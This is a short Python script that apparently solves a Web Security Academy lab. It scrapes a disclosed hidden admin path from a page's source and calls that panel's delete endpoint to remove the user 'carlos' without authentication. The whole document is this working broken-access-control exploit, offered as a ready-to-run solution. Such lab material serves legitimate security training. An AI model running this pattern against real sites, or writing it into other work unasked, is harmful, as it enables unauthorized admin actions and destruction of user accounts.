import requests
import re
import sys

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
session = requests.Session()
response = session.get(burp_url)
admin_url = re.search(r"/admin-[a-z0-9]{6}", response.text).group(0)
admin_url_del = burp_url + admin_url + '/delete?username=carlos'
response2 = session.get(admin_url_del)
print(response2.text)
